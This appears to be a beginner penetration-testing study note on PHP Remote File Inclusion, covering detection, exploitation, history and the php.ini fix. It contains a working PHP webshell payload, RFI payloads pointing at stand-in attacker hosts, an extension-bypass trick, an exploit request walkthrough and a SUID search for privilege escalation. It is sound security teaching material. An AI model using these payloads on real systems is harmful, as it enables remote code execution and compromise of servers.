---
tags: [vapt, rfi, rce, php, critical]
difficulty: beginner
module: "23 - Path Traversal and LFI/RFI"
topic: "23.10 Remote File Inclusion (RFI)"
---

# 23.10 — Remote File Inclusion (RFI)

## What is it?
Remote File Inclusion (RFI) is the catastrophic sibling of LFI. While LFI requires an attacker to include a file that already exists on the local server, RFI allows an attacker to supply a URL pointing to a file on an external, attacker-controlled server. 

When a vulnerable application (typically PHP) takes user input and passes it to an `include()` or `require()` statement without validation, and the server is configured to allow fetching remote files, the application will reach out across the internet, download the attacker's script, and execute it locally.

RFI is one of the easiest vulnerabilities to exploit because it bypasses the need for "Log Poisoning" or complex chains. You simply host a webshell on your own server, point the vulnerable application to it, and instantly achieve Remote Code Execution. 

Think of it like a restaurant that allows you to provide a recipe for them to cook. With LFI, you have to trick the chef into reading a recipe already hidden somewhere in the kitchen. With RFI, you just hand the chef a URL to your personal blog, and they fetch your poisoned recipe from the internet and cook it.

## ASCII Diagram
```text
[Attacker] 
   │
   │ 1. Hosts a malicious PHP script: http://evil.com/shell.txt
   │    Content: <?php system('whoami'); ?>
   │
   │ 2. Sends Request: GET /index.php?page=http://evil.com/shell.txt
   ▼
[Vulnerable Web Server]
   │
   │ 3. Executes: include("http://evil.com/shell.txt");
   │
[PHP Engine]
   │
   │ 4. Reaches out to evil.com over the internet.
   │ 5. Downloads the contents of shell.txt.
   │ 6. Executes <?php system('whoami'); ?> locally.
   ▼
[Operating System] ─── 7. Returns "www-data" to the attacker.
```

## How to Find It
- **Manual steps:**
  1. Identify a parameter that fetches pages, modules, or templates (e.g., `?page=about`).
  2. Instead of a local path (`../../../`), supply an external URL: `?page=http://google.com/`.
  3. If the target application renders the Google homepage inside its own layout, it is vulnerable to RFI.
  4. (Important: The external URL must point to plain text containing PHP code, not a `.php` file executing on your own server, otherwise your server will execute it instead of the target server).

- **Tool commands with flags explained:**
  Hosting a simple Python web server to serve your payload:
  ```bash
  # 1. Create the payload
  echo "<?php system(\$_GET['cmd']); ?>" > shell.txt
  
  # 2. Host it on port 8000
  python3 -m http.server 8000
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Confirm RFI by pointing the parameter to an external website you control.
  2. Create a malicious payload file on your machine. **Do not name it `.php`.** Name it `.txt` so that your Python web server serves the raw text rather than trying to execute it.
  3. Start a web server on your machine (`python3 -m http.server 80`).
  4. Ensure your machine is reachable by the target (using Ngrok or a public VPS if attacking over the internet).
  5. Trigger the RFI: `https://target.com/index.php?page=http://YOUR_IP/shell.txt&cmd=id`.
  6. The target server fetches `shell.txt`, executes the PHP inside it, and passes the `cmd` parameter.

- **Actual payloads:**
  **Basic RFI:**
  ```text
  ?page=http://attacker.com/shell.txt
  ```
  **Bypassing forced extensions (e.g., appends `.php` to your input):**
  If the code is `include($_GET['page'] . '.php');`, use a null byte (on legacy PHP) or a URL query string to neutralize the appended string.
  ```text
  ?page=http://attacker.com/shell.txt?
  # The server evaluates: http://attacker.com/shell.txt?.php
  # Your server ignores the .php query parameter and serves shell.txt!
  ```

- **Real HTTP request/response examples:**
  **Exploit Request:**
  ```http
  GET /load.php?module=http://10.10.14.5/shell.txt&cmd=hostname HTTP/1.1
  Host: target.com
  ```
  **Python Web Server Log (Attacker Side):**
  ```text
  10.10.10.50 - - [14/Oct/2023 15:22:10] "GET /shell.txt HTTP/1.0" 200 -
  ```
  **Exploit Response (Target Side):**
  ```http
  HTTP/1.1 200 OK
  
  target-prod-server-01
  ```

## Real-World Example
In the early 2000s and 2010s, RFI was one of the most common critical vulnerabilities in open-source PHP software (like early versions of Joomla and WordPress plugins). Attackers would scan the internet for `?page=` parameters and automatically inject URLs pointing to massive, full-featured webshells (like the `c99` shell). Because PHP's default configuration previously allowed fetching remote URLs in `include()` statements, millions of servers were compromised instantly by automated botnets.

## How to Fix It
- **Developer remediation:**
  Fix the code by never passing user input to `include()`. Use a strict allowlist.
  
  Crucially, fix the environment configuration. Modern PHP installations have remote file inclusion disabled by default. You must ensure `allow_url_include` is set to `Off` in the `php.ini` file. (Note: `allow_url_fopen` can remain `On` for legitimate external API calls, but `allow_url_include` MUST be `Off`).

- **Code snippet:**
  **php.ini (Disabling RFI):**
  ```ini
  ; This prevents include() or require() from fetching URLs over HTTP/FTP
  allow_url_include = Off
  
  ; Optional: Disable fetching URLs entirely if the app doesn't need to make outbound requests
  allow_url_fopen = Off 
  ```

## Chaining Opportunities
- This vuln + [[Missing File Permissions / Sudo Privileges]] → RFI provides immediate command execution. Once the shell is obtained, check for SUID binaries (`find / -perm -4000 2>/dev/null`) to escalate to root.
- This vuln + [[13.01 SSRF (Server-Side Request Forgery)]] → If RFI doesn't execute the code (e.g., the vulnerable function is `file_get_contents()` instead of `include()`), you have an SSRF vulnerability. You can use this to scan the internal network or access internal cloud metadata APIs.

## Related Notes
- [[05 - Local File Inclusion (LFI)]]
- [[01 - SSRF (Server-Side Request Forgery)]]
